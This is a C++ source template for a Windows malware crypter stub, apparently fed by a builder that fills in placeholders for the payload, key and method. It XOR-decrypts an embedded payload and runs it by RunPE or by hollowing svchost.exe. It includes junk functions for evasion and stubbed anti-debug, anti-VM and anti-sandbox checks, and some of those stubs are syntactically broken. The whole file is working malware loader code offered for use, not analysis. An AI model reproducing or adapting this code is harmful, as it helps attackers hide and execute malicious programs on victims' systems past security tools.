#include <windows.h>
#include <vector>
#include <string>
#include <stdint.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <winternl.h>
#include <iphlpapi.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "iphlpapi.lib")

// Forward declarations
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// PEB structure for anti-debug
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union {
        ULONG CrossProcessFlags;
        struct {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ReservedBits0 : 27;
        };
    };
    union {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
} PEB, *PPEB;

void JunkBlock1() { /*JUNK1*/ }
void JunkBlock2() { /*JUNK2*/ }
void JunkBlock3() { /*JUNK3*/ }
void JunkBlock4() { /*JUNK4*/ }
void JunkBlock5() { /*JUNK5*/ }
void JunkBlock6() { /*JUNK6*/ }
void UselessFunc1(int n) { for (int i=0; i<n; ++i) { volatile int x = i*i; } }
int UselessFunc2(int a, int b) { return a*b + a - b; }
bool UselessFunc3() { SYSTEMTIME st; GetSystemTime(&st); return st.wYear > 2022; }

bool AntiDebug() { //ANTIDEBUG }
bool AntiVM() { //ANTIVM }
bool AntiSandbox() { //ANTISANDBOX }
bool AntiTiming() { //ANTITIMING }

void RunAllChecks() {
    JunkBlock1(); JunkBlock2(); JunkBlock3();
    if (AntiDebug() || AntiVM() || AntiSandbox() || AntiTiming())
        ExitProcess(42);
    JunkBlock4(); JunkBlock5(); JunkBlock6();
}

static const char* g_sig = "STUB_SIG_/*RANDSTR*/";
static const uint32_t g_buildTime = /*BUILDTIME*/;
static const char* g_key = "/*KEY*/";
static const int g_method = /*METHOD*/; // 0=RunPE, 1=Hollowing
static const uint8_t g_payload[] = { /*PAYLOAD*/ };
static const size_t g_payload_size = sizeof(g_payload);

void DecryptPayload(std::vector<uint8_t>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
}

bool RunPE_Impl(const std::vector<uint8_t>& image) {
    if (image.size() < sizeof(IMAGE_DOS_HEADER)) return false;

    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if (dosHeader->e_lfanew >= image.size() || dosHeader->e_lfanew < 0) return false;

    auto ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS*>(image.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;

    // Получаем путь к текущему exe для использования как цель
    wchar_t selfPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) return false;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(selfPath, NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    bool success = false;
    do {
        CONTEXT context = {};
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) break;

        PVOID imageBase = nullptr;
#ifdef _WIN64
        if (!ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + sizeof(PVOID) * 2), 
                              &imageBase, sizeof(imageBase), NULL)) break;
#else
        if (!ReadProcessMemory(pi.hProcess, (PVOID)(context.Ebx + sizeof(PVOID) * 2), 
                              &imageBase, sizeof(imageBase), NULL)) break;
#endif

        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) break;

        auto NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        if (!NtUnmapViewOfSection) break;

        NtUnmapViewOfSection(pi.hProcess, imageBase);

        PVOID newImageBase = VirtualAllocEx(pi.hProcess, 
                                           (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                           ntHeaders->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!newImageBase) {
            newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!newImageBase) break;
        }

        if (!WriteProcessMemory(pi.hProcess, newImageBase, image.data(),
                               ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) break;

        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
                const void* sectionSrc = image.data() + sectionHeader[i].PointerToRawData;
                
                if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                                       sectionHeader[i].SizeOfRawData, NULL)) {
                    goto cleanup;
                }
            }
        }

        if (newImageBase != (PVOID)ntHeaders->OptionalHeader.ImageBase) {
#ifdef _WIN64
            if (!WriteProcessMemory(pi.hProcess, (PVOID)(context.Rdx + sizeof(PVOID) * 2),
                                   &newImageBase, sizeof(newImageBase), NULL)) break;
#else
            if (!WriteProcessMemory(pi.hProcess, (PVOID)(context.Ebx + sizeof(PVOID) * 2),
                                   &newImageBase, sizeof(newImageBase), NULL)) break;
#endif
        }

        ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
        context.Rcx = entryPoint;
#else
        context.Eax = entryPoint;
#endif

        if (!SetThreadContext(pi.hThread, &context)) break;
        success = true;
    } while (false);

cleanup:
    if (success) {
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 1);
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return success;
}

bool Hollowing_Impl(const std::vector<uint8_t>& payload) {
    if (payload.size() < sizeof(IMAGE_DOS_HEADER)) return false;

    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if (dosHeader->e_lfanew >= payload.size() || dosHeader->e_lfanew < 0) return false;

    auto ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS*>(payload.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;

    // Используем svchost.exe как цель для hollowing
    wchar_t targetPath[MAX_PATH];
    ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\svchost.exe", targetPath, MAX_PATH);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    bool success = false;
    do {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) break;

        auto NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");
        auto NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        
        if (!NtQueryInformationProcess || !NtUnmapViewOfSection) break;

        PROCESS_BASIC_INFORMATION pbi = {};
        NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, 
                                                   &pbi, sizeof(pbi), NULL);
        if (status != 0) break;

        PVOID imageBase = nullptr;
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(pi.hProcess, 
                              (PVOID)((ULONG_PTR)pbi.PebBaseAddress + sizeof(PVOID) * 2),
                              &imageBase, sizeof(imageBase), &bytesRead) || bytesRead != sizeof(imageBase)) {
            break;
        }

        NtUnmapViewOfSection(pi.hProcess, imageBase);

        PVOID newImageBase = VirtualAllocEx(pi.hProcess, 
                                           (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                           ntHeaders->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!newImageBase) {
            newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!newImageBase) break;
        }

        SIZE_T bytesWritten = 0;
        if (!WriteProcessMemory(pi.hProcess, newImageBase, payload.data(),
                               ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
            break;
        }

        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        bool sectionsOk = true;
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0 && 
                sectionHeader[i].PointerToRawData < payload.size()) {
                
                PVOID sectionDest = (PVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
                const void* sectionSrc = payload.data() + sectionHeader[i].PointerToRawData;
                DWORD sectionSize = min(sectionHeader[i].SizeOfRawData, 
                                       (DWORD)(payload.size() - sectionHeader[i].PointerToRawData));
                
                if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                                       sectionSize, &bytesWritten)) {
                    sectionsOk = false;
                    break;
                }
            }
        }
        
        if (!sectionsOk) break;

        if (newImageBase != (PVOID)ntHeaders->OptionalHeader.ImageBase) {
            if (!WriteProcessMemory(pi.hProcess, 
                                   (PVOID)((ULONG_PTR)pbi.PebBaseAddress + sizeof(PVOID) * 2),
                                   &newImageBase, sizeof(newImageBase), &bytesWritten)) {
                break;
            }
        }

        CONTEXT context = {};
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) break;

        ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
        context.Rcx = entryPoint;
#else
        context.Eax = entryPoint;
#endif

        if (!SetThreadContext(pi.hThread, &context)) break;
        success = true;
    } while (false);

    if (success) {
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 1);
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return success;
}

bool RunPE(const std::vector<uint8_t>& exe) {
    return RunPE_Impl(exe);
}

bool Hollowing(const std::vector<uint8_t>& exe) {
    return Hollowing_Impl(exe);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    RunAllChecks();
    std::vector<uint8_t> payload(g_payload, g_payload + g_payload_size);
    DecryptPayload(payload, g_key);
    if (g_method == 0)
        RunPE(payload);
    else
        Hollowing(payload);
    return 0;
}